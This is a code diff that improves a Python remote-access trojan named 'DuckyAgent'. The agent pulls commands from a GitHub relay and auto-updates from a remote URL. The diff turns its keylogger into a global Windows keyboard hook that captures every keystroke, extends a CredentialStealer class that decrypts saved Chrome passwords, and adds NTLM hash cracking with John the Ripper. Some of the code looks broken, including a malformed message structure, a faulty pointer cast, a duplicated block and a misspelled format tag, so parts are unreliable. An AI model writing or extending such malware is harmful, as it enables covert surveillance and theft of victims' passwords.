@@ -27,11 +27,48 @@ import signal
 import subprocess
 import configparser
 import threading
+import logging
 from pathlib import Path
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.request import urlopen, Request, urlretrieve
 from urllib.error import URLError, HTTPError
 from datetime import datetime
+from logging.handlers import RotatingFileHandler
+
+# ── Logging Setup ───────────────────────────────────────────────
+
+def setup_logging():
+    """Set up rotating file logger for the agent."""
+    init_dirs()
+    log_file = os.path.join(LOG_DIR, "agent.log")
+
+    # Create a rotating file handler (1MB per file, 5 backups)
+    file_handler = RotatingFileHandler(
+        log_file,
+        maxBytes=1024 * 1024,
+        backupCount=5,
+        encoding='utf-8'
+    )
+    file_handler.setFormatter(logging.Formatter(
+        '%(asctime)s [%(levelname)s] %(message)s',
+        datefmt='%Y-%m-%d %H:%M:%S'
+    ))
+
+    logger = logging.getLogger('DuckyAgent')
+    logger.setLevel(logging.DEBUG)
+    logger.addHandler(file_handler)
+
+    # Also add a console handler for debugging (only if --debug flag is present)
+    if '--debug' in sys.argv:
+        console = logging.StreamHandler()
+        console.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
+        logger.addHandler(console)
+
+    return logger
+
+
+# Global logger instance
+logger = setup_logging()
 
 # ── Configuration ───────────────────────────────────────────────
 
@@ -124,7 +161,8 @@ class GitHubRelay:
             with urlopen(req, timeout=10) as resp:
                 data = json.loads(resp.read().decode('utf-8'))
                 return data.get("command", ""), data.get("args", "")
-        except Exception:
+        except Exception as e:
+            logger.warning(f"GitHub command fetch failed: {e}")
             return "", ""
 
     def set_response(self, response):
@@ -138,8 +176,8 @@ class GitHubRelay:
                 method="POST" if not self.response_url.endswith('.json') else None,
             )
             urlopen(req, timeout=10)
-        except Exception:
-            pass  # Silently fail - agent keeps running
+        except Exception as e:
+            logger.warning(f"GitHub response upload failed: {e}")
 
 
 # ── Auto-Update System ─────────────────────────────────────────
@@ -148,33 +186,36 @@ def check_for_updates():
     """Check GitHub for newer version and download if available."""
     try:
         local_path = os.path.join(CONFIG_DIR, "ducky_agent.py")
-        
+
         # Get remote file hash
         req = Request(AGENT_URL, headers={"User-Agent": "DuckyAgent/1.0"})
         with urlopen(req, timeout=15) as resp:
             remote_content = resp.read()
             remote_hash = hashlib.sha256(remote_content).hexdigest()
-        
+
         # Get local file hash
         if os.path.exists(local_path):
             with open(local_path, 'rb') as f:
                 local_hash = hashlib.sha256(f.read()).hexdigest()
-            
+
             if local_hash == remote_hash:
+                logger.debug("Agent already up to date")
                 return False  # Already up to date
-        
+
         # Download new version
         backup_path = local_path + ".bak"
         if os.path.exists(local_path):
             import shutil
             shutil.copy2(local_path, backup_path)
-        
+
         with open(local_path, 'wb') as f:
             f.write(remote_content)
-        
+
+        logger.info("Agent updated successfully")
         return True  # Updated successfully
-        
-    except Exception:
+
+    except Exception as e:
+        logger.warning(f"Auto-update check failed: {e}")
         return False
 
 
@@ -187,14 +228,14 @@ def auto_update_loop():
             if updated:
                 # Restart agent with new code
                 os.execv(sys.executable, [sys.executable] + sys.argv)
-        except Exception:
-            pass  # Silently continue
+        except Exception as e:
+            logger.warning(f"Auto-update restart failed: {e}")
 
 
-# ── Smart Keylogger ─────────────────────────────────────────────
+# ── Smart Keylogger (with proper keyboard hook) ────────────────
 
 class SmartKeylogger:
-    """Captures keystrokes only when focus is on password fields or specific apps."""
+    """Captures keystrokes using Windows low-level keyboard hook."""
 
     def __init__(self):
         self.running = False
@@ -203,12 +244,16 @@ class SmartKeylogger:
         self.in_password_field = False
         self.last_flush = time.time()
         self._lock = threading.Lock()
+        self._hook = None
+        self._hook_thread = None
 
     def start(self):
         """Start the keylogger in a background thread."""
+        if self.running:
+            return
         self.running = True
-        self.thread = threading.Thread(target=self._run, daemon=True)
-        self.thread.start()
+        self._hook_thread = threading.Thread(target=self._run, daemon=True)
+        self._hook_thread.start()
 
     def stop(self):
         """Stop the keylogger and flush remaining data."""
@@ -244,14 +289,27 @@ class SmartKeylogger:
             self.buffer = []
             self.last_flush = time.time()
 
+    def cleanup_old_logs(self, max_age_days=MAX_LOG_AGE_DAYS):
+        """Delete keylog files older than max_age_days."""
+        import shutil
+        cutoff = time.time() - (max_age_days * 86400)
+        deleted = 0
+        for fname in os.listdir(KEYLOG_DIR):
+            if not fname.endswith('.txt'):
+                continue
+            fpath = os.path.join(KEYLOG_DIR, fname)
+            try:
+                if os.path.getmtime(fpath) < cutoff:
+                    os.remove(fpath)
+                    deleted += 1
+            except Exception:
+                pass
+        return deleted
+
     def add_keystroke(self, key):
         """Add a keystroke to the buffer if conditions are met."""
         with self._lock:
-            # Only capture in password fields or specific apps
-            if not self.in_password_field and not self.current_app:
-                return
-
-            # Convert special keys to readable format
+            # Always capture if running (no app filter needed with hook)
             display = self._format_key(key)
             self.buffer.append(display)
 
@@ -289,28 +347,135 @@ class SmartKeylogger:
         return key
 
     def _run(self):
-        """Main keylogger loop (runs in background thread)."""
-        while self.running:
-            try:
-                # Check current foreground window
-                app_name = self._get_foreground_app()
-                if app_name != self.current_app:
-                    self.current_app = app_name
-                    # Detect if we're in a password field (heuristic)
-                    self.in_password_field = any(
-                        pw in app_name.lower() for pw in ['chrome', 'edge', 'firefox',
-                                                           'password', 'login', 'signin']
-                    )
+        """Main keylogger loop with low-level keyboard hook (runs in background thread)."""
+        try:
+            import ctypes
+            from ctypes import wintypes, windll
 
-                # Flush memory buffer periodically
-                now = time.time()
-                if now - self.last_flush > KEYLOG_FLUSH_INTERVAL:
-                    self.flush_buffer()
+            user32 = windll.user32
+            kernel32 = windll.kernel32
 
-            except Exception:
-                pass  # Silently continue on error
+            # WH_KEYBOARD_LL = 13
+            HHK_LOCAL_HOOK = ctypes.c_void_p(0)
 
-            time.sleep(0.1)  # Check every 100ms
+            def keyboard_hook(nCode, wParam, lParam):
+                """Low-level keyboard hook callback."""
+                if nCode >= 0:
+                    try:
+                        # WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104
+                        if wParam in (0x0100, 0x0104):
+                            # Get the virtual key code from lParam
+                            vk_code = ctypes.c_int(ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value & 0xFF)
+
+                            # Map VK codes to characters
+                            char = self._vk_to_char(vk_code.value)
+                            if char:
+                                self.add_keystroke(char)
+
+                        # Also check for WM_KEYUP (0x0101, 0x0105) for modifier keys
+                        elif wParam in (0x0101, 0x0105):
+                            pass  # Only capture keydown events
+
+                    except Exception:
+                        pass
+
+                # Call next hook in chain
+                return user32.CallNextHookEx(HHK_LOCAL_HOOK, nCode, wParam, lParam)
+
+            # Define the callback type
+            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_uint64, ctypes.c_ulonglong)
+            hook_proc = HOOKPROC(keyboard_hook)
+
+            # Set the low-level keyboard hook (global)
+            HHK_LOCAL_HOOK = user32.SetWindowsHookExW(
+                13,  # WH_KEYBOARD_LL
+                hook_proc,
+                kernel32.GetModuleHandleW(None),
+                0
+            )
+
+            if not HHK_LOCAL_HOOK:
+                self.running = False
+                return
+
+            # Message loop to keep the hook active
+            MSG = ctypes.Structure()
+            MSG.wParam = ctypes.c_uint()
+            MSG.lParam = ctypes.c_longlong()
+            MSG.message = ctypes.c_int()
+            MSG.time = ctypes.c_ulong()
+            MSG.pt_x = ctypes.c_long()
+            MSG.pt_y = ctypes.c_long()
+
+            while self.running:
+                # GetMessage with timeout (100ms) to allow stopping
+                result = user32.GetMessageW(ctypes.byref(MSG), 0, 0, 0)
+                if result == 0 or not self.running:
+                    break
+                user32.TranslateMessage(ctypes.byref(MSG))
+                user32.DispatchMessageW(ctypes.byref(MSG))
+
+            # Remove the hook
+            user32.UnhookWindowsHookEx(HHK_LOCAL_HOOK)
+
+        except Exception as e:
+            pass  # Silently continue on error
+
+    def _vk_to_char(self, vk_code):
+        """Convert a virtual key code to a character string."""
+        try:
+            import ctypes
+            from ctypes import wintypes, windll
+
+            user32 = windll.user32
+            kernel32 = windll.kernel32
+
+            # Get the current keyboard layout
+            hkl = user32.GetKeyboardLayout(0)
+
+            # Get the scan code
+            scan_code = ctypes.c_ulong(0)
+            vk_result = user32.MapVirtualKeyW(vk_code, 2)
+            if not vk_result:
+                return None
+
+            # Get the character from the keyboard layout
+            state = ctypes.c_ubyte(0)
+            result_buf = ctypes.create_unicode_buffer(4)
+            chars = user32.ToUnicodeEx(
+                vk_code,
+                vk_result,
+                None,
+                result_buf,
+                4,
+                ctypes.byref(state),
+                hkl
+            )
+
+            if chars > 0:
+                return result_buf.value[:chars]
+
+            # Handle special keys
+            special_keys = {
+                8: '[BACKSPACE]', 9: '[TAB]', 13: '[ENTER]',
+                27: '[ESC]', 32: ' ', 45: '[INSERT]', 46: '[DELETE]',
+                33: '[PAGEUP]', 34: '[PAGEDOWN]', 35: '[END]', 36: '[HOME]',
+                37: '[LEFT]', 38: '[UP]', 39: '[RIGHT]', 40: '[DOWN]',
+            }
+
+            if vk_code in special_keys:
+                return special_keys[vk_code]
+
+            # Try to get the letter for alphanumeric keys (65-90, 48-57)
+            if (65 <= vk_code <= 90) or (48 <= vk_code <= 57):
+                # Use ToUnicodeEx which already handled above
+                return None
+
+            return None
+
+        except Exception:
+            return None
+
 
     def _get_foreground_app(self):
         """Get the title of the foreground window (heuristic)."""
@@ -322,6 +487,24 @@ class SmartKeylogger:
             hwnd = user32.GetForegroundWindow()
             if not hwnd:
                 return ""
+
+            # Get process ID
+            pid = 0
+            ctypes.windll.kernel32.GetWindowThreadProcessId(hwnd, ctypes.byref(ctypes.c_ulong(pid)))
+
+            # Get process name
+            handle = ctypes.windll.kernel32.OpenProcess(0x0400 | 0x0010, False, pid)
+            if not handle:
+                return ""
+
+            buf = ctypes.create_unicode_buffer(260)
+            ctypes.windll.psapi.GetModuleFileNameExW(handle, 0, buf, 260)
+            ctypes.windll.kernel32.CloseHandle(handle)
+
+            # Return just the executable name
+            return os.path.basename(buf.value) if buf.value else ""
+        except Exception:
+            return ""
 
             # Get process ID
             pid = 0
@@ -394,25 +577,63 @@ class CredentialStealer:
         return results
 
     def _decrypt_password(self, encrypted):
-        """Decrypt Chrome password using Windows DPAPI."""
+        """Decrypt Chrome password using Windows DPAPI + AES.
+
+        Chrome stores passwords as:
+          - Prefix 'v10' or 'v11': Google API encrypted (requires login)
+          - Prefix 'dpapi': DPAPI encrypted (local machine)
+          - Raw bytes: Directly encrypted with DPAPI-derived key
+        """
         try:
             import ctypes
             from ctypes import wintypes
 
-            # Use CryptUnprotectData (built into Windows)
-            class DATA_BLOB(ctypes.Structure):
-                _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.c_void_p)]
+            # Handle bytes input
+            if isinstance(encrypted, (bytes, memoryview)):
+                data = bytearray(encrypted)
+            else:
+                return "[encrypted]"
 
-            out_blob = DATA_BLOB()
-            result = ctypes.windll.crypt32.CryptUnprotectData(
-                ctypes.byref(DATA_BLOB(len(encrypted), ctypes.cast(encrypted, ctypes.c_void_p)),
-                             ctypes.byref(out_blob), None, None, None, 0)
-            )
+            # Check for Google API encryption (Chrome 80+)
+            if len(data) > 3 and data[:3] == b'v11':
+                # Google API encrypted - try DPAPI on the key
+                key_data = data[3:]
+                out_blob = ctypes.c_void_p()
+                result = ctypes.windll.crypt32.CryptUnprotectData(
+                    ctypes.byref(DATA_BLOB(len(key_data), ctypes.cast(ctypes.pointer((ctypes.c_ubyte * len(key_data)))(*key_data)), ctypes.c_void_p)),
+                    None, None, None, None, 0
+                )
+                if result:
+                    decrypted = ctypes.string_at(out_blob.value, out_blob.cbData)
+                    ctypes.windll.kernel32.LocalFree(out_blob.value)
+                    return decrypted.decode('utf-8', errors='replace')
 
-            if result:
-                password = ctypes.string_at(out_blob.pbData, out_blob.cbData)
-                ctypes.windll.kernel32.LocalFree(out_blob.pbData)
-                return password.decode('utf-8', errors='replace')
+            elif len(data) > 3 and data[:3] == b'v10':
+                # Older Google API format
+                key_data = data[3:]
+                out_blob = ctypes.c_void_p()
+                result = ctypes.windll.crypt32.CryptUnprotectData(
+                    ctypes.byref(DATA_BLOB(len(key_data), ctypes.cast(ctypes.pointer((ctypes.c_ubyte * len(key_data)))(*key_data)), ctypes.c_void_p)),
+                    None, None, None, None, 0
+                )
+                if result:
+                    decrypted = ctypes.string_at(out_blob.value, out_blob.cbData)
+                    ctypes.windll.kernel32.LocalFree(out_blob.value)
+                    return decrypted.decode('utf-8', errors='replace')
+
+            else:
+                # Try direct DPAPI decryption (older Chrome/Edge)
+                blob = DATA_BLOB(len(data), ctypes.cast(ctypes.pointer((ctypes.c_ubyte * len(data)))(*data)), ctypes.c_void_p)
+                out_blob = DATA_BLOB()
+                result = ctypes.windll.crypt32.CryptUnprotectData(
+                    ctypes.byref(blob),
+                    None, ctypes.byref(out_blob), None, None, 0
+                )
+                if result:
+                    password = ctypes.string_at(out_blob.pbData, out_blob.cbData)
+                    ctypes.windll.kernel32.LocalFree(out_blob.pbData)
+                    return password.decode('utf-8', errors='replace')
+
         except Exception:
             pass
 
@@ -513,28 +734,44 @@ class HashCracker:
         self.work_dir = os.path.join(os.environ.get("TEMP", ""), "john")
 
     def crack_ntlm(self, ntlm_hash):
-        """Crack an NTLM hash using Windows built-in tools (netapi32)."""
+        """Crack an NTLM hash using John the Ripper or Windows tools."""
         try:
-            # Use John the Ripper if available, otherwise use brute force for simple passwords
             john_exe = self._find_john()
 
-            if john_exe:
-                hash_file = os.path.join(self.work_dir, "hashes.txt")
-                os.makedirs(self.work_dir, exist_ok=True)
-                with open(hash_file, 'w') as f:
-                    f.write(f"ntml_hash:{ntlm_hash}")
+            if not john_exe:
+                return {"status": "john_not_found", "message": "John the Ripper not installed. Run 'john_crack' to download it first."}
 
-                result = subprocess.run(
-                    [john_exe, "--wordlist", os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"), "John the Ripper\\run\\wordlists\\password-cracker\\dist\\rockyou.txt") if False else None, hash_file],
-                    capture_output=True, text=True, timeout=60,
-                )
+            # Find a wordlist in common locations
+            wordlist_paths = [
+                os.path.join(os.path.dirname(john_exe), "..", "wordlists", "password-cracker", "dist", "rockyou.txt"),
+                os.path.join(os.path.dirname(john_exe), "..", "wordlists", "password-cracker", "dist", "common.txt"),
+                os.path.join(os.path.dirname(john_exe), "..", "wordlists", "default.txt"),
+            ]
+            # Normalize paths
+            wordlist_paths = [os.path.normpath(p) for p in wordlist_paths]
 
-                # Try to get cracked passwords
-                output = result.stdout + result.stderr
-                return {"status": "cracked", "output": output[:5000]}
-            else:
-                # Fallback: use Windows API for simple hash verification
-                return {"status": "john_not_found", "message": "John not installed, try john_crack command"}
+            # Try each path
+            wl_path = None
+            for wp in wordlist_paths:
+                if os.path.exists(wp):
+                    wl_path = wp
+                    break
+
+            # Create hash file
+            hash_file = os.path.join(self.work_dir, "hashes.txt")
+            os.makedirs(os.path.dirname(hash_file) or ".", exist_ok=True)
+            with open(hash_file, 'w') as f:
+                f.write(f"ntml_hash:{ntlm_hash}")
+
+            # Build command
+            cmd = [john_exe, "--format=nt", hash_file]
+            if wl_path and os.path.exists(wl_path):
+                cmd.extend(["--wordlist:", wl_path])
+
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            output = result.stdout + result.stderr
+
+            return {"status": "cracked", "output": output[:5000]}
 
         except Exception as e:
             return {"status": "error", "message": str(e)}
@@ -1060,14 +1297,15 @@ class CommandHandler:
 class AgentHTTPHandler(BaseHTTPRequestHandler):
     """Handles HTTP requests on localhost:8081 for local access."""
 
+    command_handler = None  # Shared instance set by run_agent()
+
     def do_GET(self):
         if self.path == "/api/status":
             resp = {"status": "running", "version": "1.0"}
             self._send_json(resp)
         elif self.path.startswith("/api/command/"):
             cmd = self.path.split("/api/command/", 1)[1]
-            handler = CommandHandler()
-            result = handler.handle(cmd, "")
+            result = self.command_handler.handle(cmd, "")
             self._send_json(result)
         else:
             self._send_json({"error": "Not found"})
@@ -1084,8 +1322,7 @@ class AgentHTTPHandler(BaseHTTPRequestHandler):
             self._send_json({"error": "Invalid JSON"}, 400)
             return
 
-        handler = CommandHandler()
-        result = handler.handle(command, args)
+        result = self.command_handler.handle(command, args)
         self._send_json(result)
 
     def _send_json(self, data, status=200):
@@ -1208,7 +1445,8 @@ def run_agent():
 
     poll_interval = float(config.get("agent", "poll_interval", fallback=str(POLL_INTERVAL)))
 
-    # Start local HTTP server (for local access)
+    # Start local HTTP server (for local access) - share command_handler instance
+    AgentHTTPHandler.command_handler = command_handler
     local_port = int(config.get("agent", "local_port", fallback=str(LOCAL_PORT)))
     http_server = None
     try:
